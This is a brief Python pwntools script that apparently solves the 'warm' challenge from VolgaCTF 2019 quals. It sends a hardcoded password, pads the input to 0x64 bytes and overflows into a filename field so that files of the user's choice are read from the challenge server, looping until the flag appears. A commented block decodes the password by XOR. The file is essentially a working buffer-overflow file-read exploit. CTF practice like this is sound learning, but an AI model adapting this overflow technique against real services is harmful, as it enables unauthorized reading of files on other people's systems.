from pwn import *

while True:
	filename = raw_input('filename: ')

	r = remote('warm.q.2019.volgactf.ru', 443)

	payload = ''
	payload += 'v8&3mqPQebWFqM?x'
	payload += 'A' * (0x64 - len(payload))
	payload += filename

	r.sendafter('password!\n', payload)

	s = r.recvall(0.5)
	log.info(s)

	if 'VolgaCTF' in s:
		break

	r.close()

# xs = [0x55, 0x4e, 0x1e, 0x15, 0x5e, 0x1c, 0x21, 0x1, 0x34, 0x7, 0x35, 0x11, 0x37, 0x3c, 0x72, 0x47]
# c = 0x23
# for x in xs:
# 	c ^= x
# 	print(chr(c), end='')
